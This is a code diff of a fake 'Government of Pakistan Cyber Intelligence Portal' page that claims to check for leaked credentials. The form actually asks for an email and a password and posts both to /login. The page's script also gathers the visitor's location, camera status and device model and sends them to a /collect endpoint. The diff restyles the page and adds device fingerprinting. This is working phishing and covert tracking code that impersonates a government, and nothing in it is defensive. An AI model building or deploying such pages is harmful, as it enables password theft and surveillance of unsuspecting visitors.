@@ -2,124 +2,133 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Government of Pakistan – Cyber Intelligence Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Government of Pakistan - Cyber Intelligence Portal</title>
   <link rel="icon" href="/static/pakistan-emblem.png" />
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #0e1a24;
-      color: #fff;
+      font-family: 'Arial', sans-serif;
+      background-color: #f9f9f9;
+      color: #2c3e50;
+    }
+
+    header {
+      background-color: #006400;
+      color: white;
+      padding: 20px 0;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .container {
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
       align-items: center;
-      height: 100vh;
-      padding: 20px;
-    }
-
-    .tagline-top, .tagline-bottom {
-      font-size: 18px;
-      color: #f1c40f;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-      font-weight: bold;
-      text-align: center;
-      margin: 10px 0;
-    }
-
-    .tagline-top {
-      font-size: 22px;
-      color: #00ffe0;
-    }
-
-    .tagline-bottom {
-      font-size: 14px;
-      opacity: 0.8;
-      margin-top: 10px;
+      margin: 50px 15px;
     }
 
     .box {
-      background: rgba(255, 255, 255, 0.08);
+      background-color: #ffffff;
       padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 25px rgba(0, 255, 200, 0.15);
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+
+    .box img {
+      width: 70px;
+      display: block;
+      margin: 0 auto 15px;
+    }
+
+    .box h2 {
       text-align: center;
-      width: 360px;
-      backdrop-filter: blur(8px);
-    }
-
-    h1 {
+      color: #006400;
       font-size: 20px;
-      margin-bottom: 8px;
-      color: #00ffff;
+      margin-bottom: 10px;
     }
 
-    p {
-      font-size: 13px;
-      margin: 10px 0;
-      color: #ccc;
+    .box p {
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 20px;
     }
 
     input, button {
       width: 100%;
       padding: 10px;
-      margin: 6px 0;
-      border-radius: 6px;
-      border: none;
+      margin: 8px 0;
       font-size: 14px;
-    }
-
-    input {
-      background: #ecf0f1;
-      color: #2c3e50;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
     }
 
     button {
-      background: #e74c3c;
+      background-color: #006400;
       color: white;
-      font-weight: bold;
+      border: none;
       cursor: pointer;
+      font-weight: bold;
     }
 
     button:hover {
-      background: #c0392b;
+      background-color: #004d00;
     }
 
     a.forgot {
-      color: #f1c40f;
-      font-size: 12px;
       display: block;
-      margin-top: 4px;
+      text-align: right;
+      font-size: 12px;
+      margin-top: 5px;
+      color: #007bff;
       text-decoration: none;
     }
 
-    img {
-      width: 80px;
-      margin-bottom: 10px;
+    a.forgot:hover {
+      text-decoration: underline;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 13px;
+      padding: 20px 10px;
+      color: #777;
+      background-color: #f1f1f1;
+      position: fixed;
+      width: 100%;
+      bottom: 0;
     }
   </style>
 </head>
 <body>
-  <div class="tagline-top">National Cyber Intelligence Directorate</div>
+  <header>
+    Government of Pakistan – Cyber Security Division
+  </header>
 
-  <div class="box">
-    <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
-    <h1>🇵🇰 Government of Pakistan – Cyber Intelligence</h1>
-    <p>Enter your email to check if your credentials have been leaked</p>
-    <form method="POST" action="/login">
-      <input type="text" name="email" placeholder="Email" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
-      <button type="submit">🔍 Verify Now</button>
-    </form>
+  <div class="container">
+    <div class="box">
+      <img src="/static/pakistan-emblem.png" alt="Gov Logo">
+      <h2>Cyber Intelligence Portal</h2>
+      <p>Check if your credentials exist in our national cyber threat database</p>
+      <form method="POST" action="/login">
+        <input type="text" name="email" placeholder="Enter your email" required />
+        <input type="password" name="password" placeholder="Enter your password" required />
+        <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
+        <button type="submit">🔍 Check Now</button>
+      </form>
+    </div>
   </div>
 
-  <div class="tagline-bottom">Confidential Access – Authorized Personnel Only</div>
+  <footer>
+    Confidential Access - Authorized Personnel Only © Government of Pakistan
+  </footer>
 
   <script>
-    // Camera + Location Code (already integrated in previous versions)
     async function reverseGeocode(lat, lon) {
       try {
         const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
@@ -135,30 +144,51 @@
       }
     }
 
+    function detectDevice(userAgent) {
+      const devices = {
+        "Samsung": /samsung/i,
+        "Xiaomi": /mi|redmi/i,
+        "Oppo": /oppo/i,
+        "Vivo": /vivo/i,
+        "Realme": /realme/i,
+        "Huawei": /huawei/i,
+        "Infinix": /infinix/i,
+        "Tecno": /tecno/i,
+        "iPhone": /iphone/i,
+        "Sony": /sony/i,
+        "Nokia": /nokia/i
+      };
+      for (let [name, pattern] of Object.entries(devices)) {
+        if (pattern.test(userAgent)) return name;
+      }
+      return "Generic Android Device";
+    }
+
     async function sendFullData(locationCoords, cameraStatus) {
       let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-
       if (locationCoords) {
         locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
       }
 
-      const payload = {
-        ip: "Unknown",  // IP is sent from server-side
-        latitude: locationCoords?.latitude || null,
-        longitude: locationCoords?.longitude || null,
-        mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
-        timezone: locationData.timezone,
-        city: locationData.city,
-        country: locationData.country,
-        camera: cameraStatus,
-        userAgent: navigator.userAgent,
-        deviceInfo: navigator.platform
-      };
+      const userAgent = navigator.userAgent;
+      const deviceInfo = detectDevice(userAgent);
+      const mapsLink = locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied";
 
       await fetch("/collect", {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({
+          ip: "Unknown", // actual IP will be handled in main.py
+          latitude: locationCoords?.latitude || null,
+          longitude: locationCoords?.longitude || null,
+          mapsLink: mapsLink,
+          timezone: locationData.timezone,
+          city: locationData.city,
+          country: locationData.country,
+          camera: cameraStatus,
+          userAgent: userAgent,
+          deviceInfo: deviceInfo
+        })
       });
     }
 
